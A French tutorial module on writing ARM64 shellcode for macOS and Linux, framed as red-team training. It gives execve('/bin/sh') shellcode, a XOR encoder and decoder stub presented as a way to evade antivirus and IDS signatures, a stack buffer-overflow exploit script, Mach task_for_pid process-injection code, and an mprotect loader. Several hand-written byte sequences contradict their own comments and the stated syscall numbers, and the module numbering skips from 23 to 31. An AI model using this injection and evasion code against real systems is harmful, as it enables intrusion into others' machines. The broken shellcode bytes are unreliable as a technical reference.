# Module 23 : Shellcode ARM64

## 🎯 Ce que tu vas apprendre

- Comprendre ce qu'est un shellcode et son rôle en exploitation
- Écrire des shellcodes ARM64 pour macOS et Linux
- Éviter les null bytes et rendre le shellcode position-independent
- Encoder et injecter du shellcode dans des processus
- Bypasser les protections modernes (DEP, ASLR, PAC)

## 📚 Théorie

### Concept 1 : Qu'est-ce qu'un Shellcode ?

**C'est quoi ?**

Un **shellcode** est du **code machine** (bytecode) qu'un attaquant injecte dans un programme vulnérable pour prendre le contrôle du système. C'est un payload autonome écrit en assembleur puis converti en bytes bruts.

**Pourquoi "shell"-code ?**

Historiquement, l'objectif était d'ouvrir un **shell** (terminal) pour obtenir un accès interactif au système compromis.

**Comment ça marche ?**

Le shellcode exploite des vulnérabilités (buffer overflow, format string, etc.) pour détourner le flux d'exécution du programme et exécuter du code arbitraire.

### Concept 2 : Caractéristiques d'un Bon Shellcode

**C'est quoi ?**

Un shellcode efficace doit respecter plusieurs contraintes techniques :

1. **Petit** : Généralement < 100 bytes (contraintes de buffer)
2. **Position-independent** : Fonctionne à n'importe quelle adresse mémoire (ASLR)
3. **Sans null bytes** : Éviter `\x00` qui stoppe les fonctions string (`strcpy`, `gets`)
4. **Autosuffisant** : Pas de dépendances externes

**Pourquoi ?**

Les buffers à exploiter sont souvent limités en taille, et les protections comme ASLR randomisent les adresses mémoire. Le shellcode doit donc être flexible et compact.

**Comment ?**

- Utiliser des instructions courtes
- Employer ADR pour adressage relatif (position-independent)
- Remplacer `mov x0, #0` par `eor x0, x0, x0` (éviter null bytes)
- Utiliser des syscalls directs (pas de libc)

### Concept 3 : Défis Spécifiques macOS ARM64

**C'est quoi ?**

Sur les Mac Apple Silicon, créer un shellcode est plus complexe à cause de multiples protections matérielles et logicielles.

**Pourquoi ?**

Apple a implémenté des défenses en profondeur :
- **PAC** (Pointer Authentication) : Signe cryptographiquement les pointeurs
- **Code Signing** : Seul le code signé peut s'exécuter
- **W^X** (Write XOR Execute) : Mémoire RW ou RX, jamais RWX
- **ASLR** : Randomisation des adresses
- **SIP** (System Integrity Protection) : Protection des fichiers système

**Comment contourner ?**

- Utiliser des gadgets ROP pour contourner W^X
- Exploiter des pages déjà exécutables
- Utiliser `mprotect()` via ROP pour rendre des pages RWX
- Cibler des processus non protégés par PAC

## 🔍 Visualisation

```ascii
INJECTION DE SHELLCODE - Vue d'ensemble

PROGRAMME VULNÉRABLE                APRÈS INJECTION
┌──────────────────┐              ┌──────────────────┐
│  Code légitime   │              │  Code légitime   │
│  ...             │              │  ...             │
│  Buffer [64]     │              │  Buffer [64]     │
│                  │              │  SHELLCODE !!    │ ← Injecté
│  return address  │              │  → 0x7ff8000     │ ← Écrasé
└──────────────────┘              └──────────────────┘
                                         ↓
                                  ┌──────────────────┐
                                  │ 0x7ff8000:       │
                                  │ mov x0, #0       │
                                  │ mov x16, #0x3B   │
                                  │ adr x1, binsh    │
                                  │ svc #0x80        │
                                  │ binsh: "/bin/sh" │
                                  └──────────────────┘
                                         ↓
                                  Shell lancé !

STRUCTURE D'UN SHELLCODE ARM64

┌─────────────────────────────────────────┐
│  1. DECODER (si encodé)                 │
│     mov x1, shellcode_addr              │
│     mov w2, key                         │
│     decode_loop: ...                    │
├─────────────────────────────────────────┤
│  2. PAYLOAD                             │
│     mov x0, #0                          │
│     adr x1, binsh                       │
│     mov x2, #0                          │
│     mov x16, #0x200003B                 │
│     svc #0x80                           │
├─────────────────────────────────────────┤
│  3. DATA                                │
│     binsh: .ascii "/bin/sh\0"           │
└─────────────────────────────────────────┘

SYSCALLS macOS ARM64

┌──────────────┬─────────────┬────────────────────────┐
│ Syscall      │ X16         │ Arguments              │
├──────────────┼─────────────┼────────────────────────┤
│ exit         │ 0x2000001   │ X0 = code              │
│ read         │ 0x2000003   │ X0=fd, X1=buf, X2=len  │
│ write        │ 0x2000004   │ X0=fd, X1=buf, X2=len  │
│ open         │ 0x2000005   │ X0=path, X1=flags      │
│ execve       │ 0x200003B   │ X0=path, X1=argv, X2=e │
│ mprotect     │ 0x200004A   │ X0=addr, X1=len, X2=prot│
└──────────────┴─────────────┴────────────────────────┘
```

## 💻 Exemple pratique

### Shellcode 1 : exit(0)

Le shellcode le plus simple : terminer proprement le processus.

```asm
.global _start
_start:
    mov x0, #0              ; Code de sortie = 0
    mov x16, #0x2000001     ; Syscall exit (macOS)
    svc #0x80               ; Appel système
```

**Compilation et extraction des bytes :**

```bash
# Assembler
as -arch arm64 exit.s -o exit.o

# Linker
ld -arch arm64 -e _start -o exit exit.o

# Extraire le shellcode
objdump -d exit | grep -A3 '<_start>'

# Ou avec xxd
xxd -p exit | tr -d '\n'
```

**Bytes résultants :**
```
00 00 80 D2    # mov x0, #0
21 00 80 D2    # mov x16, #1 (mais 0x2000001 nécessite plusieurs instructions)
01 10 00 D4    # svc #0x80
```

### Shellcode 2 : write("Hello\n")

Afficher un message sur stdout.

```asm
.global _start
_start:
    adr x1, msg             ; X1 = adresse du message (PC-relative)
    mov x0, #1              ; X0 = fd (1 = stdout)
    mov x2, #6              ; X2 = longueur
    mov x16, #0x2000004     ; Syscall write
    svc #0x80               ; Appel système

    mov x0, #0              ; Code de sortie
    mov x16, #0x2000001     ; Syscall exit
    svc #0x80

msg:
    .ascii "Hello\n"
```

### Shellcode 3 : execve("/bin/sh")

Le classique : ouvrir un shell.

```asm
.global _start
_start:
    adr x0, binsh           ; X0 = pointeur vers "/bin/sh"
    mov x1, #0              ; X1 = argv (NULL)
    mov x2, #0              ; X2 = envp (NULL)

    ; Charger le numéro de syscall (0x200003B)
    mov x16, #0x3B          ; Bits bas
    movk x16, #0x200, lsl #16  ; Bits hauts

    svc #0x80               ; execve()

binsh:
    .ascii "/bin/sh\x00"
```

### Éviter les Null Bytes

**Problème :**
```asm
mov x0, #0     ; Génère : 00 00 80 D2 (contient \x00)
```

**Solution :**
```asm
eor x0, x0, x0  ; X0 = X0 XOR X0 = 0 (pas de null byte)
```

**Autre exemple :**
```asm
; MAUVAIS
mov x1, #0

; BON
sub x1, x1, x1  ; X1 = X1 - X1 = 0
```

### Encoder le Shellcode (XOR)

Pour bypasser les signatures antivirues et les IDS.

```python
#!/usr/bin/env python3

def xor_encode(shellcode, key):
    """Encode un shellcode avec XOR"""
    encoded = bytearray()
    for byte in shellcode:
        encoded.append(byte ^ key)
    return bytes(encoded)

# Shellcode original
shellcode = b"\x00\x00\x80\xD2\x21\x00\x80\xD2\x01\x10\x00\xD4"

# Encoder avec clé 0xAA
key = 0xAA
encoded = xor_encode(shellcode, key)

print("Encodé :", encoded.hex())
print("Taille :", len(encoded))
```

**Stub decoder en ARM64 :**

```asm
decoder:
    adr x1, encoded_shellcode  ; Adresse du shellcode encodé
    mov x2, #12                ; Longueur
    mov w3, #0xAA              ; Clé XOR

decode_loop:
    ldrb w4, [x1]              ; Charger 1 byte
    eor w4, w4, w3             ; XOR avec clé
    strb w4, [x1], #1          ; Écrire et incrémenter
    subs x2, x2, #1            ; Décrémenter compteur
    b.ne decode_loop           ; Boucler si != 0

    adr x0, encoded_shellcode  ; Adresse du shellcode décodé
    blr x0                     ; Exécuter

encoded_shellcode:
    .byte 0xAA, 0xAA, 0x2A, 0x78, 0x8B, 0xAA, 0x2A, 0x78, 0xAB, 0xBA, 0xAA, 0x7E
```

## 🎯 Application Red Team

### Scénario 1 : Exploiter un Buffer Overflow

**Contexte :** Application vulnérable avec buffer overflow sur la stack.

```c
// Programme vulnérable
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Pas de vérification de taille !
}

int main(int argc, char **argv) {
    if (argc > 1) {
        vulnerable(argv[1]);
    }
    return 0;
}
```

**Exploitation :**

```python
#!/usr/bin/env python3
import struct

# Shellcode execve("/bin/sh")
shellcode = (
    b"\x01\x00\x00\x10"  # adr x0, #8 (vers binsh)
    b"\x22\x00\x80\xd2"  # mov x2, #0x1
    b"\x42\x00\x80\xd2"  # mov x2, #0x2
    b"\x10\x0b\x80\xd2"  # mov x16, #0x58
    b"\x50\x06\xa0\xf2"  # movk x16, #0x32, lsl #16
    b"\x01\x10\x00\xd4"  # svc #0x80
    b"/bin/sh\x00"
)

# Padding jusqu'à la saved return address
padding = b"A" * 72

# Adresse de retour (vers le shellcode sur la stack)
# À ajuster selon ASLR
ret_addr = struct.pack("<Q", 0x16fdff000)

exploit = padding + ret_addr + shellcode

print(exploit)
```

### Scénario 2 : Process Injection

Injecter et exécuter du shellcode dans un processus distant.

```c
#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char shellcode[] =
    "\x01\x00\x00\x10"  // adr x0, #8
    "\x22\x00\x80\xd2"  // mov x2, #1
    "\x42\x00\x80\xd2"  // mov x2, #2
    "\x10\x0b\x80\xd2"  // mov x16, #88
    "\x50\x06\xa0\xf2"  // movk x16, #50, lsl #16
    "\x01\x10\x00\xd4"  // svc #0x80
    "/bin/sh";

void inject_shellcode(pid_t pid) {
    task_t task;
    kern_return_t kr;

    // Obtenir task port du processus cible
    kr = task_for_pid(mach_task_self(), pid, &task);
    if (kr != KERN_SUCCESS) {
        printf("Erreur task_for_pid: %d\n", kr);
        return;
    }

    // Allouer mémoire dans le processus distant
    mach_vm_address_t remote_addr = 0;
    mach_vm_size_t size = sizeof(shellcode);

    kr = mach_vm_allocate(task, &remote_addr, size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("Erreur mach_vm_allocate: %d\n", kr);
        return;
    }

    // Écrire le shellcode
    kr = mach_vm_write(task, remote_addr, (vm_offset_t)shellcode, size);
    if (kr != KERN_SUCCESS) {
        printf("Erreur mach_vm_write: %d\n", kr);
        return;
    }

    // Rendre la mémoire exécutable
    kr = mach_vm_protect(task, remote_addr, size, FALSE,
                         VM_PROT_READ | VM_PROT_EXECUTE);

    // Créer thread pour exécuter le shellcode
    arm_thread_state64_t state;
    memset(&state, 0, sizeof(state));
    __darwin_arm_thread_state64_set_pc_fptr(state, (void*)remote_addr);
    __darwin_arm_thread_state64_set_sp(state, remote_addr + 0x1000);

    thread_act_t thread;
    kr = thread_create_running(task, ARM_THREAD_STATE64,
                               (thread_state_t)&state,
                               ARM_THREAD_STATE64_COUNT,
                               &thread);

    if (kr == KERN_SUCCESS) {
        printf("Shellcode injecté à 0x%llx\n", remote_addr);
    }
}
```

### Scénario 3 : Bypass DEP avec mprotect()

Rendre une page RWX pour exécuter du shellcode.

```c
#include <sys/mman.h>
#include <string.h>
#include <stdio.h>

unsigned char shellcode[] = "\x00\x00\x80\xD2...";

void execute_shellcode() {
    // Allouer mémoire RW
    void *mem = mmap(NULL, sizeof(shellcode),
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (mem == MAP_FAILED) {
        perror("mmap");
        return;
    }

    // Copier shellcode
    memcpy(mem, shellcode, sizeof(shellcode));

    // Rendre exécutable
    if (mprotect(mem, sizeof(shellcode),
                 PROT_READ | PROT_EXEC) != 0) {
        perror("mprotect");
        munmap(mem, sizeof(shellcode));
        return;
    }

    // Exécuter
    void (*func)() = (void(*)())mem;
    func();

    munmap(mem, sizeof(shellcode));
}
```

## 📝 Points clés

1. **Shellcode = code machine autonome** injecté dans un processus pour l'exploiter
2. **Position-independent** : utiliser ADR pour adressage relatif au PC
3. **Éviter null bytes** : préférer `eor x0, x0, x0` à `mov x0, #0`
4. **macOS ARM64** : syscalls via `X16` et `SVC #0x80`, numéros = 0x2000000 + N
5. **Encoder** le shellcode (XOR, etc.) pour bypasser signatures AV
6. **Contournements** : ROP pour W^X, `mprotect()` pour DEP, leak ASLR

## ➡️ Prochaine étape

Module 31 : **ROP Chains ARM64** - Construire des chaînes ROP pour bypasser DEP/W^X et exécuter du code sans shellcode direct.
